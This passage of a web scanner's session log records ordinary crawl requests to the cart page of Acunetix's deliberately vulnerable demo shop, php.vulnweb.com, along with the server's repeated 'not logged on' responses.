	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:57 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4903</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="487E0FDD2922A4AFBEC316244EFDBD29"><URL>http://php.vulnweb.com:80/cart.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="487E0FDD2922A4AFBEC316244EFDBD29"><![CDATA[POST /cart.php HTTP/1.1
Referer: http://php.vulnweb.com/product.php?pic=3
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="487E0FDD2922A4AFBEC316244EFDBD29";PSID="C0F9BCECD38C144E506D47D5190B6065";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="933302cc";
X-Request-Memo: ID="c373ee57";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

price=986&addcart=3]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:57 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4903

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="487E0FDD2922A4AFBEC316244EFDBD29"><Method>POST</Method><Path>/</Path><File>cart</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>price=986&amp;addcart=3</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/product.php?pic=3</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>19</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="487E0FDD2922A4AFBEC316244EFDBD29";PSID="C0F9BCECD38C144E506D47D5190B6065";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="933302cc";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="c373ee57";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:57 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4903</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="31E1038DB6E3F7AEDFE09FE80799AC57"><URL>http://php.vulnweb.com:80/cart.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="31E1038DB6E3F7AEDFE09FE80799AC57"><![CDATA[POST /cart.php HTTP/1.1
Referer: http://php.vulnweb.com/product.php?pic=4
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="31E1038DB6E3F7AEDFE09FE80799AC57";PSID="4D851B7FB1D245602E09CD660B9694F0";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="367db7c2";
X-Request-Memo: ID="6aca6740";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

price=1000&addcart=4]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:57 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4903

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="31E1038DB6E3F7AEDFE09FE80799AC57"><Method>POST</Method><Path>/</Path><File>cart</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>price=1000&amp;addcart=4</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/product.php?pic=4</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>20</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="31E1038DB6E3F7AEDFE09FE80799AC57";PSID="4D851B7FB1D245602E09CD660B9694F0";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="367db7c2";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="6aca6740";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:57 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4903</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session 